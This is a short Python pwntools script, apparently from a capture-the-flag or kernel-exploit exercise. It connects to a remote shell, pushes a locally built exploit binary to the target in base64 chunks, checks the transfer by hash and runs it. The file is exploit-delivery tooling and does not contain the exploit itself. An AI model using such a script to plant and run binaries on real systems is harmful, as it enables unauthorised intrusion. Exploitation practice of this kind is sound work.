from pwn import *

# Binary filename
exploit_path = "cmake-build-debug/exploit"

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

io = remote(sys.argv[1], int(sys.argv[2]))


def send_command(command: bytes, print_result=True) -> bytes:
    info(f"Sending command '{command.decode('ascii')}'".encode("ascii"))
    io.sendline(command)

    result = io.recvuntil(b"$ ")
    result = result[:result.rfind(b"\n")][len(command)+2:]

    if result != b"" and print_result:
        info(result)

    return result


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Wait for initial prompt
io.recvuntil(b"$ ")

# Delivery script
send_command(b"cd /home/user", print_result=False)
send_command(b"rm -f exploit exploit.b64", print_result=False)
send_command(b"touch exploit.b64", print_result=False)

sha256 = hashlib.sha256()
with open(exploit_path, "rb") as exploit_file:
    while (data := exploit_file.read(510)) != b"":
        encoded_data: str = base64.b64encode(data).decode("ascii")
        send_command(f"echo {encoded_data} >> exploit.b64".encode("ascii"),
                     print_result=False)
        sha256.update(data)

# Get hash of local exploit binary
local_exploit_hash = sha256.hexdigest()

# Prepare exploit for execution
send_command(b"base64 -d exploit.b64 > exploit")
send_command(b"chmod +x exploit")

# Confirm binary was transferred correctly
remote_exploit_hash_raw = send_command(b"sha256sum exploit", print_result=False)
remote_exploit_hash = remote_exploit_hash_raw.decode("ascii").split(" ")[0]
if remote_exploit_hash != local_exploit_hash:
    error(b"Remote exploit was not transferred correctly.")
    exit(1)

# Execute exploit
send_command(b"./exploit")
